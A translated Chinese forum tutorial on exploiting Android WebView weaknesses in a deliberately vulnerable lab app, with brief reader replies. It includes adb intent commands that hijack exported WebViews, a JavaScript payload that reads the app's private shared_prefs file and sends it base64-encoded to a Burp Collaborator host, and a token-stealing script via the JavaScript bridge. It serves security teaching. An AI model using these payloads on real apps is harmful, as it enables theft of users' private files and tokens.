---
title: '[翻译]利用Android WebView漏洞'
url: https://bbs.kanxue.com/thread-278760.htm
tid: 278760
author: Max_hhg
date: '2023-09-07'
tags: [Android安全, 翻译, 基础理论]
crawled_at: '2026-07-31T14:38:17+08:00'
replies: 3
---

原文标题：Exploiting Android WebView Vulnerabilities
原文地址：<https://medium.com/mobis3c/exploiting-android-webview-vulnerabilities-e2bcff780892>

目录- 什么是WebView？
- WebViews是可导出的
- 利用
- 为webview启用setAllowUniversalAccessFromFileURLs
- 利用
- 启用JavaScript并为WebView提供接口
## 什么是WebView？

WebView类是Android的View类的扩展，允许您将网页显示为活动布局的一部分。它不包含完整开发的Web浏览器的任何功能，如导航控件或地址栏。默认情况下，WebView只是显示一个网页。
 ![图片描述](https://bbs.kanxue.com/upload/attach/202309/876202_S4CBYAUG5A5UQFX.png)
*Twitter使用WebView加载网站。*
为了进行测试，我们将使用易受攻击的[WebView应用程序](https://github.com/t4kemyh4nd/vulnwebview)来学习如何手动利用Android应用程序中的WebView漏洞。登录凭据是用户名：**vuln**和密码：**webview**（以防需要使用）。
 ![图片描述](https://bbs.kanxue.com/upload/attach/202309/876202_RYEV354ZZHX52AU.png)
**易受攻击的WebView应用程序**

## WebViews是可导出的

在介绍漏洞之前，我们需要确保WebView是我们目标应用程序的一部分。

由于WebViews是应用程序中的活动的一部分，我们需要对apk进行反编译，查看AndroidManifest.xml文件和应用程序的Activity，以检查是否存在易受攻击的WebView。

让我们首先将我们的应用程序加载到[Jadx](https://medium.com/mobis3c/setting-up-an-android-pentesting-environment-29991aa0c3f1#e4f6)反编译器中，以分析清单和活动。
 ![图片描述](https://bbs.kanxue.com/upload/attach/202309/876202_NHJFPX47GDSGVNQ.png)
*反编译工具*
现在，我们将查看哪些组件是**导出**的。我们可以得出结论，一个组件可以通过两种方式来导出：

- 如果组件明确声明了“**exported=true**”属性。
- 如果组件具有意图过滤器且没有“**exported=false**”属性。

 ![图片描述](https://bbs.kanxue.com/upload/attach/202309/876202_7U3HEM9F95QRUCZ.png)
*activities exported*
一些组件如**SupportWebView**、**RegistrationWebView**被明确导出，而**MainActivity**是通过指定意图过滤器来导出的，这表明该应用程序正在使用WebViews。
 ![图片描述](https://bbs.kanxue.com/upload/attach/202309/876202_5GEHKNRYKB5DJKS.png)
*confirming with*
我们可以看到loadWebView函数，它通过从intent中获取字符串来加载URL。
 ![图片描述](https://bbs.kanxue.com/upload/attach/202309/876202_88ZCZNV3RY7WZAE.png)
*webview code*
因此，第三方应用程序可以通过向该组件发送带有URL字符串的意图来利用这种行为，而目标应用程序将接受并执行该意图，因为该组件已被导出。也就是说，第三方应用程序可以访问目标应用程序中的WebView组件。

## 利用

我们将使用ADB发送一个意图到该组件，这个intent将在应用程序的上下文中打开攻击者提供的恶意网页。

| 1 | `adb shell am start` `-``n componentname` `-``-``es string` `"domain.com"` |
|-|-|

使用adb shell在设备上启动唯一的shell，使用am（活动管理器）start命令，-n参数指定组件名称，--es参数后跟URL作为额外的字符串。

因此，我们的adb命令将如下所示：

| 1 | `adb shell am start` `-``n com.tmh.vulnwebview``/``.RegistrationWebView` `-``-``es reg_url` `"https://3kal.medium.com"` |
|-|-|

 ![图片描述](https://bbs.kanxue.com/upload/attach/202309/876202_NNQA2UCW2BQASY3.png)
*发送intent到webviews*
 ![图片描述](https://bbs.kanxue.com/upload/attach/202309/876202_AFHBQX7RB96MWTU.png)
*webview加载了攻击者的url*

## 为webview启用setAllowUniversalAccessFromFileURLs

开发人员可以配置的另一个设置是允许在文件方案URL的上下文中运行的JavaScript访问来自任何源的内容，包括其他文件方案URL。

该设置会移除所有同源策略的限制，允许WebView从文件中向Web发出请求，这通常是不可能的。也就是说，攻击者可以使用JavaScript读取本地文件，并将其发送到攻击者控制的域名上。

如果WebView被导出，这种行为可能非常危险，因为它可以允许攻击者读取可能对应用程序来说是私有的任意文件。
 ![图片描述](https://bbs.kanxue.com/upload/attach/202309/876202_Z6EEFPYYRA94WH5.png)
*setAllowUniversalAccessFromFileURLs*

## 利用

现在让我们看看如何利用上述应用程序中使用的这个设置。
 ![图片描述](https://bbs.kanxue.com/upload/attach/202309/876202_CFXBH8KP6MXYWEP.png)
现在，让我们为漏洞中讨论的JavaScript漏洞创建利用程序。

我已经使用了我的Burp Collaborator链接来获取内容，您可以使用您方便的任何链接。

| 1234567891011121314 | `<script>``var url` `=` `'file:///data/data/com.tmh.vulnwebview/shared_prefs/MainActivity.xml'``;` `/``/``local` `file``function load(url) {``var xhr` `=` `new XMLHttpRequest();``xhr.onreadystatechange` `=` `function() {``if` `(xhr.readyState` `=``=``=` `4``) {``fetch(``'https://8ktm71h4wjnqo72wgqbzvnr7jypodd.burpcollaborator.net/?exfiltrated='` `+` `btoa(xhr.responseText));` `/``/``send b64 encoded` `file` `to attacker``}``}``xhr.``open``(``'GET'``, url, true);``xhr.send('');``}``load(url)``<``/``script>` |
|-|-|

 ![图片描述](https://bbs.kanxue.com/upload/attach/202309/876202_Y5GMEPNRJ3XX49D.png)
*任意文件读取漏洞*
请将上述代码添加到sauafu.html文件中，并使用adb将该文件移动到sdcard。
 ![图片描述](https://bbs.kanxue.com/upload/attach/202309/876202_AACA7FQX7CVYF5W.png)
*将exploit推入设备*
利用程序加载本地文件的内容并将其返回给攻击者的URL。

现在运行带有利用文件的intent。

| 1 | `adb shell am start` `-``n com.tmh.vulnwebview``/``.RegistrationWebView` `-``-``es reg_url` `"file:///sdcard/sauafu.html"` |
|-|-|

 ![图片描述](https://bbs.kanxue.com/upload/attach/202309/876202_CA37R49QCJKTT8F.png)
*intent启动*
 ![图片描述](https://bbs.kanxue.com/upload/attach/202309/876202_FXY2SK9D42YDQMZ.png)
*空注册页面*
现在我们应该已经在Burp Collaborator或您使用的其他工具中收到了以Base64编码的文件内容。
 ![图片描述](https://bbs.kanxue.com/upload/attach/202309/876202_TGXDXYV5GUSNZBY.png)
*利用poc*
我们可以在右侧窗口框中看到以Base64编码接收到的文件内容的解码结果。

## 启用JavaScript并为WebView提供接口

开发人员可以通过添加此配置来启用WebView中的JavaScript。

| 1 | `webView.getSettings().setJavaScriptEnabled(true);` |
|-|-|

添加此配置将在网页的JavaScript和应用程序的客户端Java代码之间创建一个接口。也就是说，网页的JavaScript可以访问和注入应用程序的Java代码。

| 1 | `webView.addJavascriptInterface(new WebAppInterface(this),` `"Android"``);` |
|-|-|

如果这个活动被导出，那么这可能是危险的，允许攻击者进行许多攻击，包括XSS攻击和从应用程序中窃取令牌。

##利用
针对这种情况的利用，我们不能使用上述相同的WebView，因为它没有使用接口。因此，我们将使用另一个使用了接口的WebView。
 ![图片描述](https://bbs.kanxue.com/upload/attach/202309/876202_X4C9WDNSXGV66MX.png)
*support webview*
我们可以使用SupportWebView，您可以看到JavaScript已启用，并且使用了名为"**Android**"的接口。
 ![图片描述](https://bbs.kanxue.com/upload/attach/202309/876202_6U2774BU6DZ44NC.png)
*接口声明*

| 123 | `<script` `type``=``"text/javascript"``>``document.write(``"token: "` `+` `Android.getUserToken());``<``/``script>` |
|-|-|

该脚本通过从名为**Android**的接口中的getUserToken()方法生成令牌并将其写入。

从Apache服务器托管此脚本，并将端口80连接到ngrok以获取HTTPS链接（不能使用HTTP链接）。

| 1234 | `sudo service apache2 start``.``/``ngrok http` `80``and` `use https ngrok link``adb shell am start` `-``n com.tmh.vulnwebview``/``.Supportwebview` `-``-``es support_url` `"https://8d95c0fe086f.ngrok.io/token.html"` |
|-|-|

 ![图片描述](https://bbs.kanxue.com/upload/attach/202309/876202_GAPNA4KYAB8GQPS.png)
*intent*
 ![图片描述](https://bbs.kanxue.com/upload/attach/202309/876202_FCG428SW2QRAAKA.png)
*token窃取*
我们可以通过替换文档来显示XSS警报。用您喜欢的XSS有效负载在上面的javascript代码中编写一行代码。

| 123 | `<script` `type``=``"text/javascript"``>``alert(``"kal"``);``<``/``script>` |
|-|-|

 ![图片描述](https://bbs.kanxue.com/upload/attach/202309/876202_ARPPD67FHKEM8NC.png)
*XSS Alert.*
我们已经涵盖了与WebViews相关的4个漏洞：

- 导出的WebView（WebView劫持）
- 启用WebView的文件访问（文件窃取）
- 使用setJavaScriptEnabled（XSS）
- JavaScript接口（令牌窃取）

注意：大部分内容都来自[Farah Hawa在YouTube上的视频](https://www.youtube.com/watch?v=qS5PkC-37io)。所有的功劳归她所有，如果您喜欢这个内容，请观看并点赞她的视频。

---

# 回复

## 回复 by tDasm (#2)

*2023-9-7 14:52*

这哪是漏洞？这是程序与webview交互。

## 回复 by 秋狝 (#3)

*2023-9-8 09:39*

感谢分享

## 回复 by mb_fidppcok (#4)

*2023-10-18 09:50*

感谢分享
